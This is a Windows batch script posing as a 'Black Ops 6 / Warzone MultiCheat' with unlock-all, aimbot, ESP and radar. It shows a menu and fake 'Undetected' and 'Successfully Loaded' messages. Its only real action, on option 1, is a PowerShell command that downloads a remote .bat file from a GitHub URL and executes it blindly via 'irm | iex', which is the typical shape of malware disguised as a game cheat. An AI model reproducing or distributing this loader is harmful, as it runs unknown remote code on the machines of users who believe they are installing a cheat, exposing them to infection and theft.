��&cls
@echo off
color 0a
title Bo6 Warzone MultiCheat
echo   ---------------------------------------------
echo   x            Black ops 6, Warzone           x
echo   x       Unlock All, Aimbot, Esp, Radar      x 
echo   x          Made By, WarrenBruhfet           x
echo   ---------------------------------------------
echo Last Update: %date%
color 0a 
echo Undetected
color 0a
echo.
echo.
echo Press 1 to Load
echo Press 2 to Exit
echo.

set /p one=Enter choice:  

if /i "%one%"=="1" goto Load
if /i "%one%"=="2" exit

:Load
echo Loading...
ping localhost >nul
start powershell -noexit -command "irm https://raw.githubusercontent.com/WarrenBruhfet/random/refs/heads/main/mangomango.bat | iex"
ping localhost >nul	
ping localhost >nul
cls
echo Successfully Loaded Have Fun! 
echo You May Exit Now...
Pause

exit
